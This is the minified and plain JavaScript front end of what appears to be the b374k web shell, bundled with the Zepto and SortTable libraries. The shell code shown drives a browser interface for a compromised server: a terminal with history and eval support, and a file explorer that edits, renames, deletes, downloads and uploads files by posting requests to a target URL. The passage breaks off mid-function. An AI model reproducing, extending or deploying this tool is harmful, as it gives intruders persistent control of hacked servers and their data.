c?c.returnValue===!1:c.getPreventDefault&&c.getPreventDefault())b.isDefaultPrevented=u}return b}function z(a){var b,c={originalEvent:a};for(b in a)!w.test(b)&&a[b]!==d&&(c[b]=a[b]);return y(c,a)}var b=a.zepto.qsa,c=1,d,e=Array.prototype.slice,f=a.isFunction,g=function(a){return typeof a=="string"},h={},i={},j="onfocusin"in window,k={focus:"focusin",blur:"focusout"},l={mouseenter:"mouseover",mouseleave:"mouseout"};i.click=i.mousedown=i.mouseup=i.mousemove="MouseEvents",a.event={add:s,remove:t},a.proxy=function(b,c){if(f(b)){var d=function(){return b.apply(c,arguments)};return d._zid=m(b),d}if(g(c))return a.proxy(b[c],b);throw new TypeError("expected function")},a.fn.bind=function(a,b,c){return this.on(a,b,c)},a.fn.unbind=function(a,b){return this.off(a,b)},a.fn.one=function(a,b,c,d){return this.on(a,b,c,d,1)};var u=function(){return!0},v=function(){return!1},w=/^([A-Z]|returnValue$|layer[XY]$)/,x={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"};a.fn.delegate=function(a,b,c){return this.on(b,a,c)},a.fn.undelegate=function(a,b,c){return this.off(b,a,c)},a.fn.live=function(b,c){return a(document.body).delegate(this.selector,b,c),this},a.fn.die=function(b,c){return a(document.body).undelegate(this.selector,b,c),this},a.fn.on=function(b,c,h,i,j){var k,l,m=this;if(b&&!g(b))return a.each(b,function(a,b){m.on(a,c,h,b,j)}),m;!g(c)&&!f(i)&&i!==!1&&(i=h,h=c,c=d);if(f(h)||h===!1)i=h,h=d;return i===!1&&(i=v),m.each(function(d,f){j&&(k=function(a){return t(f,a.type,i),i.apply(this,arguments)}),c&&(l=function(b){var d,g=a(b.target).closest(c,f).get(0);if(g&&g!==f)return d=a.extend(z(b),{currentTarget:g,liveFired:f}),(k||i).apply(g,[d].concat(e.call(arguments,1)))}),s(f,b,i,h,c,l||k)})},a.fn.off=function(b,c,e){var h=this;return b&&!g(b)?(a.each(b,function(a,b){h.off(a,c,b)}),h):(!g(c)&&!f(e)&&e!==!1&&(e=c,c=d),e===!1&&(e=v),h.each(function(){t(this,b,e,c)}))},a.fn.trigger=function(b,c){return b=g(b)||a.isPlainObject(b)?a.Event(b):y(b),b._args=c,this.each(function(){"dispatchEvent"in this?this.dispatchEvent(b):a(this).triggerHandler(b,c)})},a.fn.triggerHandler=function(b,c){var d,e;return this.each(function(f,h){d=z(g(b)?a.Event(b):b),d._args=c,d.target=h,a.each(n(h,b.type||b),function(a,b){e=b.proxy(d);if(d.isImmediatePropagationStopped())return!1})}),e},"focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.trigger(b)}}),["focus","blur"].forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.each(function(){try{this[b]()}catch(a){}}),this}}),a.Event=function(a,b){g(a)||(b=a,a=b.type);var c=document.createEvent(i[a]||"Events"),d=!0;if(b)for(var e in b)e=="bubbles"?d=!!b[e]:c[e]=b[e];return c.initEvent(a,d,!0),y(c)}}(Zepto),function($){function triggerAndReturn(a,b,c){var d=$.Event(b);return $(a).trigger(d,c),!d.isDefaultPrevented()}function triggerGlobal(a,b,c,d){if(a.global)return triggerAndReturn(b||document,c,d)}function ajaxStart(a){a.global&&$.active++===0&&triggerGlobal(a,null,"ajaxStart")}function ajaxStop(a){a.global&&!--$.active&&triggerGlobal(a,null,"ajaxStop")}function ajaxBeforeSend(a,b){var c=b.context;if(b.beforeSend.call(c,a,b)===!1||triggerGlobal(b,c,"ajaxBeforeSend",[a,b])===!1)return!1;triggerGlobal(b,c,"ajaxSend",[a,b])}function ajaxSuccess(a,b,c,d){var e=c.context,f="success";c.success.call(e,a,f,b),d&&d.resolveWith(e,[a,f,b]),triggerGlobal(c,e,"ajaxSuccess",[b,c,a]),ajaxComplete(f,b,c)}function ajaxError(a,b,c,d,e){var f=d.context;d.error.call(f,c,b,a),e&&e.rejectWith(f,[c,b,a]),triggerGlobal(d,f,"ajaxError",[c,d,a||b]),ajaxComplete(b,c,d)}function ajaxComplete(a,b,c){var d=c.context;c.complete.call(d,b,a),triggerGlobal(c,d,"ajaxComplete",[b,c]),ajaxStop(c)}function empty(){}function mimeToDataType(a){return a&&(a=a.split(";",2)[0]),a&&(a==htmlType?"html":a==jsonType?"json":scriptTypeRE.test(a)?"script":xmlTypeRE.test(a)&&"xml")||"text"}function appendQuery(a,b){return b==""?a:(a+"&"+b).replace(/[&?]{1,2}/,"?")}function serializeData(a){a.processData&&a.data&&$.type(a.data)!="string"&&(a.data=$.param(a.data,a.traditional)),a.data&&(!a.type||a.type.toUpperCase()=="GET")&&(a.url=appendQuery(a.url,a.data),a.data=undefined)}function parseArguments(a,b,c,d){var e=!$.isFunction(b);return{url:a,data:e?b:undefined,success:e?$.isFunction(c)?c:undefined:b,dataType:e?d||c:c}}function serialize(a,b,c,d){var e,f=$.isArray(b),g=$.isPlainObject(b);$.each(b,function(b,h){e=$.type(h),d&&(b=c?d:d+"["+(g||e=="object"||e=="array"?b:"")+"]"),!d&&f?a.add(h.name,h.value):e=="array"||!c&&e=="object"?serialize(a,h,c,b):a.add(b,h)})}var jsonpID=0,document=window.document,key,name,rscript=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,scriptTypeRE=/^(?:text|application)\/javascript/i,xmlTypeRE=/^(?:text|application)\/xml/i,jsonType="application/json",htmlType="text/html",blankRE=/^\s*$/;$.active=0,$.ajaxJSONP=function(a,b){if("type"in a){var c=a.jsonpCallback,d=($.isFunction(c)?c():c)||"jsonp"+ ++jsonpID,e=document.createElement("script"),f=window[d],g,h=function(a){$(e).triggerHandler("error",a||"abort")},i={abort:h},j;return b&&b.promise(i),$(e).on("load error",function(c,h){clearTimeout(j),$(e).off().remove(),c.type=="error"||!g?ajaxError(null,h||"error",i,a,b):ajaxSuccess(g[0],i,a,b),window[d]=f,g&&$.isFunction(f)&&f(g[0]),f=g=undefined}),ajaxBeforeSend(i,a)===!1?(h("abort"),i):(window[d]=function(){g=arguments},e.src=a.url.replace(/=\?/,"="+d),document.head.appendChild(e),a.timeout>0&&(j=setTimeout(function(){h("timeout")},a.timeout)),i)}return $.ajax(a)},$.ajaxSettings={type:"GET",beforeSend:empty,success:empty,error:empty,complete:empty,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:jsonType,xml:"application/xml, text/xml",html:htmlType,text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0},$.ajax=function(options){var settings=$.extend({},options||{}),deferred=$.Deferred&&$.Deferred();for(key in $.ajaxSettings)settings[key]===undefined&&(settings[key]=$.ajaxSettings[key]);ajaxStart(settings),settings.crossDomain||(settings.crossDomain=/^([\w-]+:)?\/\/([^\/]+)/.test(settings.url)&&RegExp.$2!=window.location.host),settings.url||(settings.url=window.location.toString()),serializeData(settings),settings.cache===!1&&(settings.url=appendQuery(settings.url,"_="+Date.now()));var dataType=settings.dataType,hasPlaceholder=/=\?/.test(settings.url);if(dataType=="jsonp"||hasPlaceholder)return hasPlaceholder||(settings.url=appendQuery(settings.url,settings.jsonp?settings.jsonp+"=?":settings.jsonp===!1?"":"callback=?")),$.ajaxJSONP(settings,deferred);var mime=settings.accepts[dataType],headers={},setHeader=function(a,b){headers[a.toLowerCase()]=[a,b]},protocol=/^([\w-]+:)\/\//.test(settings.url)?RegExp.$1:window.location.protocol,xhr=settings.xhr(),nativeSetHeader=xhr.setRequestHeader,abortTimeout;deferred&&deferred.promise(xhr),settings.crossDomain||setHeader("X-Requested-With","XMLHttpRequest"),setHeader("Accept",mime||"*/*");if(mime=settings.mimeType||mime)mime.indexOf(",")>-1&&(mime=mime.split(",",2)[0]),xhr.overrideMimeType&&xhr.overrideMimeType(mime);(settings.contentType||settings.contentType!==!1&&settings.data&&settings.type.toUpperCase()!="GET")&&setHeader("Content-Type",settings.contentType||"application/x-www-form-urlencoded");if(settings.headers)for(name in settings.headers)setHeader(name,settings.headers[name]);xhr.setRequestHeader=setHeader,xhr.onreadystatechange=function(){if(xhr.readyState==4){xhr.onreadystatechange=empty,clearTimeout(abortTimeout);var result,error=!1;if(xhr.status>=200&&xhr.status<300||xhr.status==304||xhr.status==0&&protocol=="file:"){dataType=dataType||mimeToDataType(settings.mimeType||xhr.getResponseHeader("content-type")),result=xhr.responseText;try{dataType=="script"?(1,eval)(result):dataType=="xml"?result=xhr.responseXML:dataType=="json"&&(result=blankRE.test(result)?null:$.parseJSON(result))}catch(e){error=e}error?ajaxError(error,"parsererror",xhr,settings,deferred):ajaxSuccess(result,xhr,settings,deferred)}else ajaxError(xhr.statusText||null,xhr.status?"error":"abort",xhr,settings,deferred)}};if(ajaxBeforeSend(xhr,settings)===!1)return xhr.abort(),ajaxError(null,"abort",xhr,settings,deferred),xhr;if(settings.xhrFields)for(name in settings.xhrFields)xhr[name]=settings.xhrFields[name];var async="async"in settings?settings.async:!0;xhr.open(settings.type,settings.url,async,settings.username,settings.password);for(name in headers)nativeSetHeader.apply(xhr,headers[name]);return settings.timeout>0&&(abortTimeout=setTimeout(function(){xhr.onreadystatechange=empty,xhr.abort(),ajaxError(null,"timeout",xhr,settings,deferred)},settings.timeout)),xhr.send(settings.data?settings.data:null),xhr},$.get=function(a,b,c,d){return $.ajax(parseArguments.apply(null,arguments))},$.post=function(a,b,c,d){var e=parseArguments.apply(null,arguments);return e.type="POST",$.ajax(e)},$.getJSON=function(a,b,c){var d=parseArguments.apply(null,arguments);return d.dataType="json",$.ajax(d)},$.fn.load=function(a,b,c){if(!this.length)return this;var d=this,e=a.split(/\s/),f,g=parseArguments(a,b,c),h=g.success;return e.length>1&&(g.url=e[0],f=e[1]),g.success=function(a){d.html(f?$("<div>").html(a.replace(rscript,"")).find(f):a),h&&h.apply(d,arguments)},$.ajax(g),this};var escape=encodeURIComponent;$.param=function(a,b){var c=[];return c.add=function(a,b){this.push(escape(a)+"="+escape(b))},serialize(c,a,b),c.join("&").replace(/%20/g,"+")}}(Zepto),function(a){a.fn.serializeArray=function(){var b=[],c;return a([].slice.call(this.get(0).elements)).each(function(){c=a(this);var d=c.attr("type");this.nodeName.toLowerCase()!="fieldset"&&!this.disabled&&d!="submit"&&d!="reset"&&d!="button"&&(d!="radio"&&d!="checkbox"||this.checked)&&b.push({name:c.attr("name"),value:c.val()})}),b},a.fn.serialize=function(){var a=[];return this.serializeArray().forEach(function(b){a.push(encodeURIComponent(b.name)+"="+encodeURIComponent(b.value))}),a.join("&")},a.fn.submit=function(b){if(b)this.bind("submit",b);else if(this.length){var c=a.Event("submit");this.eq(0).trigger(c),c.isDefaultPrevented()||this.get(0).submit()}return this}}(Zepto),function(a){"__proto__"in{}||a.extend(a.zepto,{Z:function(b,c){return b=b||[],a.extend(b,a.fn),b.selector=c||"",b.__Z=!0,b},isZ:function(b){return a.type(b)==="array"&&"__Z"in b}});try{getComputedStyle(undefined)}catch(b){var c=getComputedStyle;window.getComputedStyle=function(a){try{return c(a)}catch(b){return null}}}}(Zepto)


/**
*
* SortTable
* version 2
* 7th April 2007
* Stuart Langridge, http://www.kryogenix.org/code/browser/sorttable/
*
**/
var h=!0,j=!1;
sorttable={e:function(){arguments.callee.i||(arguments.callee.i=h,k&&clearInterval(k),document.createElement&&document.getElementsByTagName&&(sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,l(document.getElementsByTagName("table"),function(a){-1!=a.className.search(/\bsortable\b/)&&sorttable.k(a)})))},k:function(a){0==a.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
if(1==a.tHead.rows.length){sortbottomrows=[];for(var b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=document.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];var c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(document.getElementById("sorttable_sortfwdind")),sortrevind=document.createElement("span"),sortrevind.id="sorttable_sortrevind",
sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(document.getElementById("sorttable_sortrevind")),sortfwdind=document.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=document.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=document.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=document.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(var a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});var g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
sorttable.l;for(var c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(var b="",c=0;c<a.childNodes.length;c++)b+=
sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(var b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?
-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&
(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(var c=0,e=a.length-1,g=h;g;){for(var g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};document.addEventListener&&document.addEventListener("DOMContentLoaded",sorttable.e,j);if(/WebKit/i.test(navigator.userAgent))var k=setInterval(function(){/loaded|complete/.test(document.readyState)&&sorttable.e()},10);
window.onload=sorttable.e;var n=1;function p(a){var b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);var c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(var e=0;e<a.length;e++)b.call(c,a[e],e,a)});
Function.prototype.forEach=function(a,b,c){for(var e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){var c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};

var loading_count = 0;
var running = false;
var defaultTab = 'explorer';
var currentTab = $('#'+defaultTab);
var tabScroll = new Object;
var onDrag = false;
var onScroll = false;
var scrollDelta = 1;
var scrollCounter = 0;
var scrollSpeed = 60;
var scrollTimer = '';
var dragX = '';
var dragY = '';
var dragDeltaX = '';
var dragDeltaY = '';
var editSuccess = '';
var terminalHistory = new Array();
var terminalHistoryPos = 0;
var evalSupported = "";
var evalReady = false;
var resizeTimer = '';
var portableWidth = 700;
var portableMode = null;

Zepto(function($){
	if(init_shell){
		var now = new Date();
		output("started @ "+ now.toGMTString());
		output("cwd : "+get_cwd());
		output("module : "+module_to_load);

		show_tab();
		xpl_bind();
		eval_init();
		
		window_resize();
		
		xpl_update_status();
		
		$(window).on('resize', function(e){
			clearTimeout(resizeTimer);
			resizeTimer = setTimeout("window_resize()", 1000);
		});

		$('.menuitem').on('click', function(e){
			selectedTab = $(this).attr('href').substr(2);
			show_tab(selectedTab);
		});

		$('#logout').on('click', function(e){
			var cookie = document.cookie.split(';');
			for(var i=0; i<cookie.length; i++){
				var entries = cookie[i], entry = entries.split("="), name = entry[0];
				document.cookie = name + "=''; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/";
			}
			localStorage.clear();
			location.href = targeturl;
		});

		$('#totop').on('click', function(e){
			$(window).scrollTop(0);
		});
		$('#totop').on('mouseover', function(e){
			onScroll = true;
			clearTimeout(scrollTimer);
			start_scroll('top');
		});
		$('#totop').on('mouseout', function(e){
			onScroll = false;
			scrollCounter = 0;
		});
		$('#tobottom').on('click', function(e){
			$(window).scrollTop($(document).height()-$(window).height());
		});
		$('#tobottom').on('mouseover', function(e){
			onScroll = true;
			clearTimeout(scrollTimer);
			start_scroll('bottom');
		});
		$('#tobottom').on('mouseout', function(e){
			onScroll = false;
			scrollCounter = 0;
		});
		$('#basicInfo').on('mouseenter', function(e){
			$('#toggleBasicInfo').show();
		});
		$('#basicInfo').on('mouseleave', function(e){
			$('#toggleBasicInfo').hide();
		});
		$('#toggleBasicInfo').on('click', function(e){
			$('#basicInfo').hide();
			$('#showinfo').show();
			$('#toggleBasicInfo').hide();
			localStorage.setItem('infoBarShown', 'hidden');
		});
		$('#showinfo').on('click', function(e){
			$('#basicInfo').show();
			$('#showinfo').hide();
			localStorage.setItem('infoBarShown', 'shown');
		});
		
		if((infoBarShown = localStorage.getItem('infoBarShown'))){
			if(infoBarShown=='shown'){
				$('#basicInfo').show();
				$('#showinfo').hide();
			}
			else{
				$('#basicInfo').hide();
				$('#showinfo').show();
				$('#toggleBasicInfo').hide();
			}
		}
		else{
			info_refresh();
		}

		if(history.pushState){
			window.onpopstate = function(event) { refresh_tab(); };
		}
		else{
			window.historyEvent = function(event) {	refresh_tab(); };
		}
	}
});

function output(str){
	console.log('b374k> '+str);
}

function window_resize(){
	bodyWidth = $('body').width();
	if(bodyWidth<=portableWidth){
		layout_portable();
	}
	else{
		layout_normal();
	}
}

function layout_portable(){
	nav = $('#nav');
	menu = $('#menu');
	headerNav = $('#headerNav');
	content = $('#content');

	//nav.hide();
	nav.prependTo('#content');
	nav.css('padding','5px 8px');
	nav.css('margin-top', '8px');
	nav.css('display','block');
	nav.addClass('border');
	
	menu.children().css('width', '100%');
	menu.hide();
	$('#menuButton').remove();	
	headerNav.prepend("<div id='menuButton' class='boxtitle' onclick=\"$('#menu').toggle();\" style='float-left;display:inline;padding:4px 8px;margin-right:8px;'>menu</div>");
	menu.attr('onclick', "\$('#menu').hide();");
	
	$('#xplTable tr>:nth-child(4)').hide();
	$('#xplTable tr>:nth-child(5)').hide();
	if(!win){
		$('#xplTable tr>:nth-child(6)').hide();
	}
	
	tblfoot = $('#xplTable tfoot td:last-child');
	if(tblfoot[0]) tblfoot[0].colSpan = 1;
	if(tblfoot[1]) tblfoot[1].colSpan = 2;
	
	
	$('.box').css('width', '100%');
	$('.box').css('height', '100%');
	$('.box').css('left', '0px');
	$('.box').css('top', '0px');
		
	paddingTop = $('#header').height();
	content.css('padding-top', paddingTop+'px');
	
	portableMode = true;
}

function layout_normal(){	
	nav = $('#nav');
	menu = $('#menu');	
	content = $('#content');

	nav.insertAfter('#b374k');
	nav.css('padding','0');
	nav.css('margin-top', '0');
	nav.css('display','inline');
	nav.removeClass('border');
	
	menu.children().css('width', 'auto');
	menu.show();
	$('#menuButton').remove();
	menu.attr('onclick', "");
	
	$('#xplTable tr>:nth-child(4)').show();
	$('#xplTable tr>:nth-child(5)').show();
	if(!win){
		$('#xplTable tr>:nth-child(6)').show();
		colspan = 4;
	}
	else colspan = 3;
	
	tblfoot = $('#xplTable tfoot td:last-child');
	if(tblfoot[0]) tblfoot[0].colSpan = colspan;
	if(tblfoot[1]) tblfoot[1].colSpan = colspan+1;

	paddingTop = $('#header').height();
	content.css('padding-top', paddingTop+'px');
	
	portableMode = false;
}

function start_scroll(str){
	if(str=='top'){
		to = $(window).scrollTop() - scrollCounter;
		scrollCounter = scrollDelta + scrollCounter;
		if(to<=0){
			to = 0;
			onScroll = false;
		}
		else if(onScroll){
			scrollTimer = setTimeout("start_scroll('top')", scrollSpeed);
			$(window).scrollTop(to);
		}
	}
	else if(str=='bottom'){
		to = $(window).scrollTop() + scrollCounter;
		scrollCounter = scrollDelta + scrollCounter;
		bottom = $(document).height()-$(window).height();
		if(to>=bottom){
			to = bottom;
			onScroll = false;
		}
		else if(onScroll){
			scrollTimer = setTimeout("start_scroll('bottom')", scrollSpeed);
			$(window).scrollTop(to);
		}
	}
}

function get_cwd(){
	return decodeURIComponent(get_cookie('cwd'));
}

function fix_tabchar(el, e){
	if(e.keyCode==9){
		e.preventDefault();
		var s = el.selectionStart;
		el.value = el.value.substring(0,el.selectionStart) + "\t" + el.value.substring(el.selectionEnd);
		el.selectionEnd = s+1;
	}
}

function get_cookie(key){
	var res;
	return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null;
}

function set_cookie(key, value){
	document.cookie = key + '=' + encodeURIComponent(value);
}

function html_safe(str){
	if(typeof(str) == "string"){
		str = str.replace(/&/g, "&amp;");
		str = str.replace(/"/g, "&quot;");
		str = str.replace(/'/g, "&#039;");
		str = str.replace(/</g, "&lt;");
		str = str.replace(/>/g, "&gt;");
	}
	return str;
}

function ucfirst(str){
	return str.charAt(0).toUpperCase() + str.slice(1);
}

function time(){
	var d = new Date();
	return d.getTime();
}

function send_post(targetdata, callback, loading){
	if(loading==null) loading_start();
	$.ajax({
		url: targeturl,
		type: 'POST',
		data: targetdata,
		success: function(res){
			callback(res);
			if(loading==null) loading_stop();
		},
		error: function(){ if(loading==null) loading_stop(); }
	});
}

function loading_start(){
	if(!running){
		$('#overlay').show();
		running = true;
		loading_loop();
	}
}

function loading_loop(){
	if(running){
		img = $('#loading');
		img.css('transform', 'rotate('+loading_count+'deg)');
		img.css('-ms-transform', 'rotate('+loading_count+'deg)');
		img.css('-webkit-transform', 'rotate('+loading_count+'deg)');

		loading_count+=7;
		if(loading_count>360) loading_count = 0;
		if(running) setTimeout("loading_loop()",20);
	}
}

function loading_stop(){
	if(running){
		img = $('#loading');
		img.css('transform', 'rotate(0deg)');
		img.css('-ms-transform', 'rotate(0deg)');
		img.css('-webkit-transform', 'rotate(0deg)');

		$('#overlay').hide();
		running = false;
	}
}

function show_tab(id){
	if(!id){
		if(location.hash!='') id = location.hash.substr(2);
		else id = defaultTab;
	}
	refresh_tab(id);
}

function refresh_tab(id){
	if(!id){
		if(location.hash!='') id = location.hash.substr(2);
		else id = defaultTab;
	}
	$('.menuitemSelected').removeClass("menuitemSelected");
	$('#menu'+id).addClass("menuitemSelected");

	tabScroll[currentTab.attr('id')] = $(window).scrollTop();
	currentTab.hide();
	currentTab = $('#'+id);
	currentTab.show();
	window[id]();
	if(tabScroll[id]){
		$(window).scrollTop(tabScroll[id]);
	}
	hide_box();
}

function trap_enter(e, callback){
	if(e.keyCode==13){
		if(callback!=null) window[callback]();
	}
}

function show_box(title, content){
	onDrag = false;
	hide_box();
	box = "<div class='box'><p class='boxtitle'>"+title+"<span class='boxclose floatRight'>x</span></p><div class='boxcontent'>"+content+"</div><div class='boxresult'></div></div>";
	$('#content').append(box);

	box_width = $('.box').width();
	body_width = $('body').width();

	box_height = $('.box').height();
	body_height = $('body').height();

	x = (body_width - box_width)/2;
	y = (body_height - box_height)/2;
	if(x<0 || portableMode) x = 0;
	if(y<0 || portableMode) y = 0;
	if(portableMode){
		$('.box').css('width', '100%');
		$('.box').css('height', '100%');	
	}

	$('.box').css('left', x+'px');
	$('.box').css('top', y+'px');

	$('.boxclose').on('click', function(e){
		hide_box();
	});
	
	if(!portableMode){
		$('.boxtitle').on('click', function(e){
			if(!onDrag){
				dragDeltaX = e.pageX - parseInt($('.box').css('left'));
				dragDeltaY = e.pageY - parseInt($('.box').css('top'));
				drag_start();
			}
			else drag_stop();
		});
	}

	$(document).off('keyup');
	$(document).on('keyup', function(e){
		if(e.keyCode == 27) hide_box();
	});

	if($('.box input')[0]) $('.box input')[0].focus();
}

function hide_box(){
	$(document).off('keyup');
	$('.box').remove();
}

function drag_start(){
	if(!onDrag){
		onDrag = true;
		$('body').off('mousemove');
		$('body').on('mousemove', function(e){
			dragX = e.pageX;
			dragY = e.pageY;
		});
		setTimeout('drag_loop()',50);
	}
}

function drag_loop(){
	if(onDrag){
		x = dragX - dragDeltaX;
		y = dragY - dragDeltaY;
		if(y<0)y=0;
		$('.box').css('left', x+'px');
		$('.box').css('top', y+'px');
		setTimeout('drag_loop()',50);
	}
}

function drag_stop(){
	onDrag = false;
	$('body').off('mousemove');
}

function get_all_cbox_selected(id, callback){
	var buffer = new Array();
	$('#'+id).find('.cBoxSelected').not('.cBoxAll').each(function(i){
		if((href = window[callback]($(this)))){
			buffer[i] = href;
		}
	});
	return buffer;
}


function cbox_bind(id, callback){
	$('#'+id).find('.cBox').off('click');
	$('#'+id).find('.cBoxAll').off('click');

	$('#'+id).find('.cBox').on('click', function(e){
		if($(this).hasClass('cBoxSelected')){
			$(this).removeClass('cBoxSelected');
		}
		else $(this).addClass('cBoxSelected');
		if(callback!=null) window[callback]();
	});
	$('#'+id).find('.cBoxAll').on('click', function(e){
		if($(this).hasClass('cBoxSelected')){
			$('#'+id).find('.cBox').removeClass('cBoxSelected');
			$('#'+id).find('.cBoxAll').removeClass('cBoxSelected');
		}
		else{
			$('#'+id).find('.cBox').not('.cBoxException').addClass('cBoxSelected');
			$('#'+id).find('.cBoxAll').not('.cBoxException').addClass('cBoxSelected');
		}
		if(callback!=null) window[callback]();
	});
}


function action(path, type){
	title = "Action";
	content = '';
	if(type=='file') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='edit button'>edit</span><span class='ren button'>rename</span><span class='del button'>delete</span><span class='dl button'>download</span></td></tr></table>";
	if(type=='dir') content = "<table class='boxtbl'><tr><td><input type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>find</span><span class='ul button'>upload</span><span class='ren button'>rename</span><span class='del button'>delete</span></td></tr></table>";
